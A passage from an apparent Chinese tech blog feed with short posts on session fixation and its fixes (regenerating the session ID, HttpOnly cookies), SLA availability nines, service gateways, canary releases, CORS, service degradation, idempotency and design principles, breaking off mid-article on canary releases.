      <url>/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E%EF%BC%88session%20fixation%20attack%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是会话固定攻击？"><a href="#什么是会话固定攻击？" class="headerlink" title="什么是会话固定攻击？"></a>什么是会话固定攻击？</h4><p>会话固定攻击（session fixation attack）是利用应用系统在服务器的会话ID固定不变机制，借助他人用相同的会话ID获取认证和授权，然后利用该会话ID劫持他人的会话以成功冒充他人，造成会话固定攻击。</p><p><strong>看下面Session Fixation攻击的一个简单例子：</strong></p><p><img src="http://img.javastack.cn/18-1-27/44844045.jpg" alt="image"></p><p><strong>整个攻击流程是：</strong></p><p>1、攻击者Attacker能正常访问该应用网站；</p><p>2、应用网站服务器返回一个会话ID给他；</p><p>3、攻击者Attacker用该会话ID构造一个该网站链接发给受害者Victim；</p><p>4-5、受害者Victim点击该链接，携带攻击者的会话ID和用户名密码正常登录了该网站，会话成功建立；</p><p>6、攻击者Attacker用该会话ID成功冒充并劫持了受害者Victim的会话。</p><blockquote><p>更多攻击例子参考：<a href="https://www.owasp.org/index.php/Session_fixation">https://www.owasp.org/index.php/Session_fixation</a></p></blockquote><h4 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h4><p>攻击的整个过程，会话ID是没变过的，所以导致此漏洞。</p><h4 id="攻击修复"><a href="#攻击修复" class="headerlink" title="攻击修复"></a>攻击修复</h4><p><strong>1、登录重建会话</strong></p><p>每次登录后都重置会话ID，并生成一个新的会话ID，这样攻击者就无法用自己的会话ID来劫持会话，核心代码如下。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 会话失效session.invalidate();&#x2F;&#x2F; 会话重建session&#x3D;request.getSession(true);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>2、禁用客户端访问Cookie</strong></p><p>此方法也避免了配合XSS攻击来获取Cookie中的会话信息以达成会话固定攻击。在Http响应头中启用HttpOnly属性，或者在tomcat容器中配置。关于HttpOnly更多详细说明大家可以自行百度。</p><p>道高一尺，魔高一丈。目前我们已经对全线系统及时填补了该漏洞，以免给攻击者留下突破口。</p><p>转发到朋友圈给更多的朋友吧！</p>]]></content>
      
      
      <categories>
          
          <category> 安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SLA 服务可用性 4 个 9 是什么意思？怎么达到？</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/SLA%20%E6%9C%8D%E5%8A%A1%E5%8F%AF%E7%94%A8%E6%80%A7%204%20%E4%B8%AA%209%20%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F%E6%80%8E%E4%B9%88%E8%BE%BE%E5%88%B0%EF%BC%9F/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/SLA%20%E6%9C%8D%E5%8A%A1%E5%8F%AF%E7%94%A8%E6%80%A7%204%20%E4%B8%AA%209%20%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D%EF%BC%9F%E6%80%8E%E4%B9%88%E8%BE%BE%E5%88%B0%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><img src="https://images.pexels.com/photos/797673/pexels-photo-797673.jpeg?w=1260&h=750&auto=compress&cs=tinysrgb" alt="image"></p><p><strong>SLA</strong>：服务等级协议（简称：SLA，全称：service level agreement）。是在一定开销下为保障服务的性能和可用性，服务提供商与用户间定义的一种双方认可的协定。通常这个开销是驱动提供服务质量的主要因素。</p><p>SLA的定义来源百度，这到底是什么意思呢？</p><blockquote><p>我们平常经常看到互联网公司喊口号，我们今年一定要做到3个9、4个9，即99.9%、99.99%，甚至还有5个9，即99.999%。</p></blockquote><p><strong>这么多9代表什么意思呢？</strong></p><p>首先，SLA的概念，对互联网公司来说就是网站服务可用性的一个保证。9越多代表全年服务可用时间越长服务更可靠，停机时间越短，反之亦然。</p><p><strong>这么多9是怎么计算的呢？</strong></p><p>全年拿365天做计算吧，看看几个9要停机多久时间做能才能达到！</p><blockquote><p>1年 &#x3D; 365天 &#x3D; 8760小时</p><p>99.9 &#x3D; 8760 * 0.1% &#x3D; 8760 * 0.001 &#x3D; 8.76小时</p><p>99.99 &#x3D; 8760 * 0.0001 &#x3D; 0.876小时 &#x3D; 0.876 * 60 &#x3D; 52.6分钟</p><p>99.999 &#x3D; 8760 * 0.00001 &#x3D; 0.0876小时 &#x3D; 0.0876 * 60 &#x3D; 5.26分钟</p></blockquote><p>从以上看来，全年停机5.26分钟才能做到99.999%，即5个9。依此类推，要达到6个9及更多9，可说是非常难了吧。</p><p><strong>怎么做到更多的9</strong></p><p>每个公司对几个9的定义都不一样，互联网公司至少都是99.99吧。像一些政府网站，如社保公积金等，经常故障服务不可用，能做到99.9就不错了。</p><p>如果我们提供的服务可用性越低，意味着造成的损失也越大，别的不说，如果是特别重要的时刻，或许就在某一分钟，你可能就会因服务不可用而丢掉一笔大的订单，这都是始料未及的。所以，只要尽可能的提升SLA可用性才能最大化的提高企业生产力。</p><p>要做到更多的9，就要不断的监控自己的服务，服务挂掉能及时恢复服务。就像开车出远门，首先得检查轮胎，同时还得准备一个备胎一样的道理。</p><p>好了，今天就讲这么多，如果觉得有用，欢迎分享到朋友圈给更多的人。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一张图告诉你为什么是服务网关</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/%E4%B8%80%E5%BC%A0%E5%9B%BE%E5%91%8A%E8%AF%89%E4%BD%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/%E4%B8%80%E5%BC%A0%E5%9B%BE%E5%91%8A%E8%AF%89%E4%BD%A0%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>网关服务是单一访问点，并充当多项服务的代理。服务网关启用了跨所有服务的路由转发、过滤和公共处理等。</p><p>在微服务实践中远不止这点功能，它可以做到统一接入、流量管控、安全防护、业务隔离等功能。</p><p><strong>下面是服务网关的大概作用图。</strong></p><p><img src="http://img.javastack.cn/17-12-21/11334157.jpg"></p><p>看完这张图，或许你已经明白了服务网关的作用，及使用服务网关带来的诸多好处。</p><p>所以，既然服务网关有这么多作用，也是现在微服务套件中的必用组件，你还有什么理由不用服务网关呢？</p><p><strong>下图是使用了Spring Cloud的服务网关的套件图。</strong></p><p><img src="http://img.javastack.cn/18-1-13/34465023.jpg" alt="image"></p><p>Spring Cloud使用了Zuul作为服务网关组件，图中Open Service即是服务网关，Service A,B是内部实际的业务服务，通过Open Service对外进行内部服务的请求的路由、过滤等操作。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一张图告诉你什么是系统架构师</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/%E4%B8%80%E5%BC%A0%E5%9B%BE%E5%91%8A%E8%AF%89%E4%BD%A0%E4%BB%80%E4%B9%88%E6%98%AF%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%B8%88/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/%E4%B8%80%E5%BC%A0%E5%9B%BE%E5%91%8A%E8%AF%89%E4%BD%A0%E4%BB%80%E4%B9%88%E6%98%AF%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%B8%88/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/18-1-5/57808184.jpg"></p><p>这张图从架构师的综合能力、岗位认识、岗位职责等方面，清楚的画出了作为一个架构的基本准则。人人都想成为架构师，可作为架构你达到了上面的要求了吗？</p><p>系统架构师是个神奇的岗位。为什么这么说，在一个人数不多的小公司，你可能什么都需要做，身体力行，做总监兼架构师或者是主管&#x2F;高级开发兼架构师；在大公司，你可能只负责某个平台的架构，某些中间件的架构，你就是某一类的架构师。</p><p><strong>无论怎么分，作为一个架构师，你必须具备以下几个特性。</strong></p><ul><li><strong>技术能力</strong></li></ul><p>技术能力，不用置疑肯定是最重要的。技术能力弱的架构不是一个好架构。所以，你需要知道所有主流技术的基本原理、应用场景，及快速解决问题的能力。</p><p>所以，架构师必须要有见识，所需知识面肯定是要不断拓展的。你需要清楚在什么样的场景用什么样的技术比较合适，并知道可能存在什么样的风险。来了需求，你脑袋是空的，不知道用什么技术这是最可怕的。</p><ul><li><strong>架构能力</strong></li></ul><p>这个可以表现为抽象能力、整体规划能力、及设计能力。你需要照在业务的角度进行系统分解、技术选型、架构搭建，以及规范制定。架构出来了至少可以满足近几年的发展，或者可以很方便对现有架构进行扩容。</p><p>有人说架构不需要懂业务，我面试过的就有明确表示不做业务架构。当然有方面的架构师，如中间件架构师，运维基础设施架构师等。但一般的后端架构师都是需要了解业务，不理解业务你如果进行系统分解，服务划分，及根据不同业务作出不同的架构？</p><p>技术都是为业务服务的，不站在业务的角度设计架构，那架构就是空谈。</p><ul><li><strong>沟通能力</strong></li></ul><p>这个看起来不是最重要的，其实也非常重要。作为一个优秀的架构师，你需要清楚的知道客户的需求，需要不断和需求人员进行沟通，以达到客户真正的目的。</p><p>不论是不是架构师，任何一个职场人，提高自己的沟通表达能力无疑是不可或缺的。有一句话怎么说的，领导就喜欢拍马屁的。做领导的大多不是技术特别牛的，但沟通能力肯定是一流的。</p><p><strong>这3点肯定是架构师的核心，但不一定是每个架构师的标准。</strong></p><p>国内做程序员，30岁左右就得转型，不然就会被嫌弃。不管是不是如此，大环境就是这样，程序员你能干到35已见天花板。</p><p>所以，程序员必须转型，管理职位数量有限，对性格、沟通表达能力有要求。所以转型架构师是首选，大家一起加油吧。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是灰度发布，灰度测试。</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/%E4%BB%80%E4%B9%88%E6%98%AF%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83%EF%BC%8C%E7%81%B0%E5%BA%A6%E6%B5%8B%E8%AF%95%E3%80%82/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/%E4%BB%80%E4%B9%88%E6%98%AF%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83%EF%BC%8C%E7%81%B0%E5%BA%A6%E6%B5%8B%E8%AF%95%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是灰度发布？"><a href="#什么是灰度发布？" class="headerlink" title="什么是灰度发布？"></a>什么是灰度发布？</h4><p>灰度发布，又名金丝雀发布，或者灰度测试，是指在黑与白之间能够平滑过渡的一种发布方式。在其上可以进行A&#x2F;B testing，即让一部分用户继续用产品特性A，一部分用户开始用产品特性B，如果用户对B没有什么反对意见，那么逐步扩大范围，把所有用户都迁移到B上面来。</p><p>灰度发布是对某一产品的发布逐步扩大使用群体范围，也叫灰度放量。灰度发布可以保证整体系统的稳定，在初始灰度的时候就可以发现、调整问题，以保证其影响度。</p><p>灰度期：灰度发布开始到结束期间的这一段时间，称为灰度期。</p><h4 id="灰度发布的意义"><a href="#灰度发布的意义" class="headerlink" title="灰度发布的意义"></a>灰度发布的意义</h4><p>灰度发布能及早获得用户的意见反馈，完善产品功能，提升产品质量，让用户参与产品测试，加强与用户互动，降低产品升级所影响的用户范围。</p><h4 id="灰度发布步骤"><a href="#灰度发布步骤" class="headerlink" title="灰度发布步骤"></a>灰度发布步骤</h4><ol><li>定义目标</li><li>选定策略：包括用户规模、发布频率、功能覆盖度、回滚策略、运营策略、新旧系统部署策略等</li><li>筛选用户：包括用户特征、用户数量、用户常用功能、用户范围等</li><li>部署系统：部署新系统、部署用户行为分析系统（web analytics）、设定分流规则、运营数据分析、分流规则微调</li><li>发布总结：用户行为分析报告、用户问卷调查、社会化媒体意见收集、形成产品功能改进列表</li><li>产品完善</li><li>新一轮灰度发布或完整发布</li></ol><p><strong>号外：只要从此站过来关注下方微信公众号的，在公众号中回复MM，可以免费送<a href="https://mp.weixin.qq.com/s/Krza7QMWYwhnIAtxpCd1bA">干货：2TB架构师四阶段视频教程</a>里面的资料。</strong></p><h4 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a><strong>推荐阅读</strong></h4><hr><p><a href="https://mp.weixin.qq.com/s/Krza7QMWYwhnIAtxpCd1bA">干货：2TB架构师四阶段视频教程</a></p><p><a href="http://mp.weixin.qq.com/s/Y2lxsucvkWsXbmOKPPfFjQ">阿里高级Java面试题（首发，70道，带详细答案）</a></p><p><a href="http://mp.weixin.qq.com/s/TarTEBF3NTGbMx6XzN8pSA">2017派卧底去阿里、京东、美团、滴滴带回来的面试题及答案</a></p><p><a href="https://mp.weixin.qq.com/s/aPSOH1VoL9JRLuVamFgO4Q">Spring面试题（70道，史上最全）</a></p><blockquote><p>分享Java干货，高并发编程，热门技术教程，微服务及分布式技术，架构设计，区块链技术，人工智能，大数据，Java面试题，以及前沿热门资讯等。<br><img src="http://upload-images.jianshu.io/upload_images/5954965-db6f2d51bc476815?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>到底什么是跨域？附解决方案！</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%98%AF%E8%B7%A8%E5%9F%9F%EF%BC%9F%E9%99%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%81/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%98%AF%E8%B7%A8%E5%9F%9F%EF%BC%9F%E9%99%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是跨域"><a href="#什么是跨域" class="headerlink" title="什么是跨域"></a>什么是跨域</h4><p>要了解跨域，先要说说同源策略。</p><p><strong>同源策略是由 Netscape 公司提出的一个著名的安全策略，所有支持 JavaScript 的浏览器都会使用这个策略。</strong></p><p>所谓同源是指，域名，协议，端口相同。当页面在执行一个脚本时会检查访问的资源是否同源，如果非同源，那么在请求数据时，浏览器会在控制台中报一个异常，提示拒绝访问。</p><p><strong>同源策略一般又分为以下两种：</strong></p><ul><li><p>DOM同源策略：禁止对不同源页面DOM进行操作。这里主要场景是iframe跨域的情况，不同域名的iframe是限制互相访问的。</p></li><li><p>XmlHttpRequest同源策略：禁止使用XHR对象向不同源的服务器地址发起HTTP请求。</p></li></ul><p><strong>那么，到底什么是跨域？</strong></p><p>跨域，指的是从一个域名去请求另外一个域名的资源。即跨域名请求！跨域时，浏览器不能执行其他域名网站的脚本，是由浏览器的同源策略造成的，是浏览器施加的安全限制。</p><p>跨域的严格一点来说就是只要协议，域名，端口有任何一个的不同，就被当作是跨域。</p><h4 id="为什么要跨域"><a href="#为什么要跨域" class="headerlink" title="为什么要跨域"></a>为什么要跨域</h4><p>现实工作开发中经常会有跨域的情况，因为公司会有很多项目，也会有很多子域名，各个项目或者网站之间需要相互调用对方的资源，避免不了跨域请求。</p><h4 id="跨域解决方案"><a href="#跨域解决方案" class="headerlink" title="跨域解决方案"></a>跨域解决方案</h4><ul><li>通过jsonp跨域</li><li>document.domain + iframe跨域</li><li>location.hash + iframe</li><li>window.name + iframe跨域</li><li>postMessage跨域</li><li>跨域资源共享（CORS）</li><li>nginx代理跨域</li><li>nodejs中间件代理跨域</li><li>WebSocket协议跨域</li></ul><p>具体方案细节可以参考下面这篇文章，我就不贴了。</p><blockquote><p><a href="https://www.cnblogs.com/roam/p/7520433.html">https://www.cnblogs.com/roam/p/7520433.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务降级的概念及应用手段</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7%E7%9A%84%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%BA%94%E7%94%A8%E6%89%8B%E6%AE%B5/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/%E6%9C%8D%E5%8A%A1%E9%99%8D%E7%BA%A7%E7%9A%84%E6%A6%82%E5%BF%B5%E5%8F%8A%E5%BA%94%E7%94%A8%E6%89%8B%E6%AE%B5/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是服务降级"><a href="#什么是服务降级" class="headerlink" title="什么是服务降级"></a>什么是服务降级</h4><p>服务降级，就是对不怎么重要的服务进行低优先级的处理。说白了，就是尽可能的把系统资源让给优先级高的服务。资源有限，而请求是无限的。如果在并发高峰期，不做服务降级处理，一方面肯定会影响整体服务的性能，严重的话可能会导致宕机某些重要的服务不可用。所以，一般在高峰期，为了保证网站核心功能服务的可用性，都要对某些服务降级处理。</p><h4 id="服务降级手段"><a href="#服务降级手段" class="headerlink" title="服务降级手段"></a>服务降级手段</h4><ul><li>拒绝服务</li></ul><p>判断应用来源，高峰时段拒绝低优先级应用的服务请求，保证核心应用正常工作。也可以随机拒绝请求，直接返回服务器繁忙，避免同时涌入过多的请求，这在电商秒杀时用的特别多。</p><ul><li>关闭服务</li></ul><p>既然是高峰期，那么可以关闭一些冷门的或者边缘不重要的服务，给核心服务让出资源。如淘宝每年双11时候都会关闭如评价、确定收货等一些与下单核心业务无关的服务，以保证用户下单支付正常，当然肯定也会使用拒绝服务，0点高峰期很多用户看到的基本是服务器繁忙。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务高可用：幂等性设计</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/%E6%9C%8D%E5%8A%A1%E9%AB%98%E5%8F%AF%E7%94%A8%EF%BC%9A%E5%B9%82%E7%AD%89%E6%80%A7%E8%AE%BE%E8%AE%A1/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/%E6%9C%8D%E5%8A%A1%E9%AB%98%E5%8F%AF%E7%94%A8%EF%BC%9A%E5%B9%82%E7%AD%89%E6%80%A7%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是幂等性？"><a href="#什么是幂等性？" class="headerlink" title="什么是幂等性？"></a>什么是幂等性？</h4><p>一般在服务调用时，读服务如果调用失败了，会自动按配置次数转移到别的服务上去请求。而写服务就不能重复请求，如果因为超时或者网络故障等原因被调用服务并没有返回成功的响应，服务调用方就认为是失败了，但很有可能的是已经成功了，如果继续重复请求写服务，如转账类的服务，可能会造成严重的后果。所以，写服务失败不能设计成继续发重复请求，被调用服务也要设计幂等性，即使重复请求，也不会造成影响。</p><p>知道上面的背景，所以，幂等性就是同样的参数，重复请求相同的服务，必须得到相同的结果。</p><h4 id="幂等性设计"><a href="#幂等性设计" class="headerlink" title="幂等性设计"></a>幂等性设计</h4><p>举一个支付的场景，请求一个第三方支付接口发起支付功能，同样的订单号，同样的金额信息，返回的都是成功。同样的订单号，不同的金额信息，返回的是订单号重复。这就是幂等性设计，第三方支付效验了请求参数和已有数据库的信息一致时直接返回已有的成功数据，如果数据不一致而又订单号重复直接报订单号重复。而如果不做幂等性设计，同样的订单号，同样的金额信息，重复支付，可能会造成金额累加。为了服务友好性，同样的订单号同样的金额信息返回订单号重复也是不友好的。</p><p>有些服务天生就具有幂等性，如修改用户邮箱、性别等，不管你重复请求修改多少次，返回的结果都是一样的。</p><p>所以，对于服务幂等性设计的要点就是一定要效验请求参数有效性，及已有数据的对比。如果同样的请求参数已经处理过就不要重复处理，直接返回，这就是幂等性核心点。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>架构师必须掌握的 10 条设计原则</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/%E6%9E%B6%E6%9E%84%E5%B8%88%E5%BF%85%E9%A1%BB%E6%8E%8C%E6%8F%A1%E7%9A%84%2010%20%E6%9D%A1%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/%E6%9E%B6%E6%9E%84%E5%B8%88%E5%BF%85%E9%A1%BB%E6%8E%8C%E6%8F%A1%E7%9A%84%2010%20%E6%9D%A1%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h4 id="01-遵循单一职责原则"><a href="#01-遵循单一职责原则" class="headerlink" title="01.遵循单一职责原则"></a>01.遵循单一职责原则</h4><p>函数是程序员的工具中最重要的抽象形式。它们能更多地被重复使用，你需要编写的代码就越少，代码也因此变得更可靠。较小的函数遵循单一职责原则更有可能被重复使用。</p><h4 id="02-尽量减少共享状态"><a href="#02-尽量减少共享状态" class="headerlink" title="02.尽量减少共享状态"></a>02.尽量减少共享状态</h4><p>你应该尽量减少函数之间的隐式共享状态，无论它是文件作用域的变量还是对象的成员字段，这有利于明确要求把值作为参数。当能明确地显示函数需要什么才可以产生所需的结果时，代码会变得更容易理解和重用。</p><p>对此的一个推论是，在一个对象中，相对于成员变量，你更应该优先选择静态的无状态变量 (static stateless variables)。</p><h4 id="03-将“副作用”局部化"><a href="#03-将“副作用”局部化" class="headerlink" title="03.将“副作用”局部化"></a>03.将“副作用”局部化</h4><p>理想的副作用（例如：打印到控制台、日志记录、更改全局状态、文件系统操作等）应该被放置到单独的模块中，而不是散布在整个代码里面。函数中的一些“副作用”功能往往违反了单一职责原则。</p><h4 id="04-优先使用不变的对象"><a href="#04-优先使用不变的对象" class="headerlink" title="04.优先使用不变的对象"></a>04.优先使用不变的对象</h4><p>如果一个对象的状态在其构造函数中仅被设置一次，并且从不再次更改，则调试会变得更加容易，因为只要构造正确就能保持有效。这也是降低软件项目复杂性的最简单方法之一。</p><h4 id="05-接口高于类"><a href="#05-接口高于类" class="headerlink" title="05.接口高于类"></a>05.接口高于类</h4><p>接收接口的函数（或 C++ 中的模板参数和概念）比在类上运行的函数更具可重用性。点击<a href="https://mp.weixin.qq.com/s/mdsU9pdZn0en1lPhfwWB-w">这里</a>查看 6 大设计原则。</p><h4 id="06-对模块应用良好的原则"><a href="#06-对模块应用良好的原则" class="headerlink" title="06.对模块应用良好的原则"></a>06.对模块应用良好的原则</h4><p>寻找机会将软件项目分解成更小的模块（例如库和应用程序），以促进模块级别的重用。对于模块，应该遵循的一些关键原则是：</p><p>1）尽可能减少依赖</p><p>2）每个项目应该有一个明确的职责</p><p>3）不要重复自身</p><p>你应该努力使你的项目保持小巧和明确。</p><h4 id="07-避免继承"><a href="#07-避免继承" class="headerlink" title="07.避免继承"></a>07.避免继承</h4><p>在面向对象编程中，继承 —— 特别是和虚拟函数结合使用时，在可重用性方面往往是一条死胡同。我很少有成功的使用或编写重载类的库的经历。</p><h4 id="08-将测试作为设计和开发的一部分"><a href="#08-将测试作为设计和开发的一部分" class="headerlink" title="08.将测试作为设计和开发的一部分"></a>08.将测试作为设计和开发的一部分</h4><p>我不是测试驱动开发的坚定分子，但开始编码时先编写测试代码会使得代码十分自然地遵循许多指导原则。这也有助于尽早发现错误。不过要注意避免编写无用的测试，良好的编码实践意味着更高级别的测试（例如单元测试中的集成测试或特征测试）在揭示缺陷方面更有效。</p><h4 id="09-优先使用标准的库"><a href="#09-优先使用标准的库" class="headerlink" title="09.优先使用标准的库"></a>09.优先使用标准的库</h4><p>我经常看到更好版本的 std::vector或 std::string ，但这几乎总是浪费时间和精力。一个明显的事实是 —— 你正在为一个新的地方引入 bug，其他开发者也不太可能重用你的代码，因为没有被广泛理解、支持和测试。</p><h4 id="10-避免编写新的代码"><a href="#10-避免编写新的代码" class="headerlink" title="10.避免编写新的代码"></a>10.避免编写新的代码</h4><p>这是每个程序员都应遵循的最重要的教诲：最好的代码就是还没写的代码。你写的代码越多，你将遇到的问题就越多，查找和修复错误就越困难。</p><p>在写一行代码之前先问一问自己，有没有一个工具、函数或者库已经实现了你所需要的功能？你真的需要自己实现这个功能，而不是调用一个已经存在的功能吗？</p><p>你还知道别的设计原则吗？欢迎留言！</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自从用了灰度发布，睡觉真香！</title>
      <link href="/2025/10/30/%E6%9E%B6%E6%9E%84/%E8%87%AA%E4%BB%8E%E7%94%A8%E4%BA%86%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83%EF%BC%8C%E7%9D%A1%E8%A7%89%E7%9C%9F%E9%A6%99%EF%BC%81/"/>
      <url>/2025/10/30/%E6%9E%B6%E6%9E%84/%E8%87%AA%E4%BB%8E%E7%94%A8%E4%BA%86%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83%EF%BC%8C%E7%9D%A1%E8%A7%89%E7%9C%9F%E9%A6%99%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大家好，我是栈长。</p><p>最近，栈长又参加了腾讯云小伙伴邀请的<strong>Techo Day 技术开放日 2.0</strong>的线上活动，这一期又是干货满满，主要是云原生和微服务方面的，比如：<strong>云原生网关、容器、安全、云监控、灰度发布</strong>等等，这些内容都与我们现有的微服务系统息息相关。</p><p>令栈长印象最深刻的就是微服务<strong>灰度发布</strong>这个主题，腾讯开源的<strong>北极星</strong>让我大开眼界，不仅涵盖微服务多个解决方案，还包括市面上少有的、开源的一站式<strong>灰度发布</strong>解决方案。</p><p>看到这，大家心里可能会有以下问题：</p><ul><li>啥是灰度发布，对咱们业务能带来什么好处？</li><li>我知道灰度发布，但是灰度发布实现方式那么多，我该怎么选？</li><li>北极星是啥，和我现在使用的灰度发布框架有啥区别呢？</li></ul><p>针对大家这些问题，所以我想有必要给大家做个专题分享，包括灰度发布的基本认识、分类，特别是<strong>腾讯开源的北极星</strong>项目，看它是如何轻松解决灰度发布的。</p><h2 id="什么是灰度发布？"><a href="#什么是灰度发布？" class="headerlink" title="什么是灰度发布？"></a>什么是灰度发布？</h2><p>说到灰度发布就不得不提 “<strong>全量发布</strong>“ ，全量发布就是所有系统都同时上线新版本，即对所有用户都同时使用新版本，这会带来什么问题？</p><p><strong>全量发布的种种弊端：</strong></p><ul><li><strong>影响用户体验：</strong> 比如某系统在双 11 前上线了一个新功能，需要给符合条件的用户发放优惠券，结果程序出 bug 导致给所有用户都发放了……又或者是新版本系统出现问题，从而影响所有用户……</li><li><strong>系统异常扩散风险：</strong> 比较某系统上线后不久出现了一个内存溢出的异常，流量接而转移到了系统其他实例，从而导致该系统所有实例都内存溢出，所有实例都处于不可用状态……</li><li><strong>影响服务可用性：</strong> 全量发布一般都需要全部停机升级，从而保证要么是新版本，要么是老版本，这显然会导致业务中断，也影响了服务可用性（SLA），就是我们经常看到互联网公司喊口号，我们今年一定要做到 3 个 9、4 个 9，即 99.9%、99.99% 等等，SLA 就是衡量系统服务可用性的一个保证，9 越多代表全年服务可用时间越长服务更可靠，停机时间越短，反之亦然。</li><li>……</li></ul><p>知道了全量发布的种种弊端，就不得不提灰度发布的重要性了，这里引出灰度发布的定义：</p><blockquote><p>灰度发布是针对 “<strong>全量发布</strong>“ 的改进，即按照一定的策略上线部分新版本，同时保留老版本，然后让部分用户体验新版本，通过一段时间新版本的反馈收集，比如：功能、性能、稳定性等指标，然后再决定是否逐步升级直至全量升级或全部回滚到老版本。</p></blockquote><p><strong>灰度发布的好处：</strong></p><ul><li><strong>降低发布影响面：</strong> 就算出问题，也只会影响部分用户，从而可以提前发现出新版本中的问题&#x2F; bug，然后在下一次灰度发布前提前修复，避免影响更多用户；</li><li><strong>提升用户体验：</strong> 除了能提前发现 bug，还能很好的收集新版本中的使用反馈，从而提前优化系统，提升用户体验，也能给后续的产品演进带来参考价值。</li></ul><h2 id="灰度发布分类"><a href="#灰度发布分类" class="headerlink" title="灰度发布分类"></a>灰度发布分类</h2><p>灰度发布的主要分类：</p><ul><li>金丝雀发布</li><li>滚动发布</li><li>蓝绿发布</li></ul><p>相信大家都或多或少都听过这些术语的概念，但很多人并不清楚原理及背后的发布流程，下面栈长画了几张图，让大家对这些灰度发布可以有更深刻的认识。</p><h3 id="1）金丝雀发布"><a href="#1）金丝雀发布" class="headerlink" 